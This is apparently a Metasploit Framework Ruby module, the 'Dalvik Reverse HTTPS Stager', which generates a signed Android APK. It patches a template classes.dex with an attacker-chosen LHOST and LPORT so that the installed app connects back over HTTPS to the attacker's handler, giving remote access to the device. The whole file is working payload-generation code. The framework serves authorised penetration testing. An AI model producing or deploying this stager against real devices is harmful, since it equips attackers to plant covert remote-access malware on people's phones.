##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'

module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Dalvik

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Dalvik Reverse HTTPS Stager',
      'Description'   => 'Tunnel communication over HTTPS',
      'Author'        => 'anwarelmakrahy',
      'License'       => MSF_LICENSE,
      'Platform'      => 'android',
      'Arch'          => ARCH_DALVIK,
      'Handler'       => Msf::Handler::ReverseHttps,
      'Stager'        => {'Payload' => ""}
    ))

    register_options(
    [
      OptInt.new('RetryCount', [true, "Number of trials to be made if connection failed", 10])
    ], self.class)
  end

  def generate_jar(opts={})
    host = datastore['LHOST'] ? datastore['LHOST'].to_s : String.new
    port = datastore['LPORT'] ? datastore['LPORT'].to_s : 8443.to_s
    raise ArgumentError, "LHOST can be 32 bytes long at the most" if host.length + port.length + 1 > 32

    jar = Rex::Zip::Jar.new

    classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})
    string_sub(classes, 'ZZZZ                                ', "ZZZZhttps://" + host + ":" + port)
    string_sub(classes, 'TTTT                                ', "TTTT" + datastore['RetryCount'].to_s) if datastore['RetryCount']
    jar.add_file("classes.dex", fix_dex_header(classes))

    files = [
      [ "AndroidManifest.xml" ],
      [ "resources.arsc" ]
    ]

    jar.add_files(files, File.join(Msf::Config.install_root, "data", "android", "apk"))
    jar.build_manifest

    cert, key = generate_cert
    jar.sign(key, cert, [cert])

    jar
  end
end
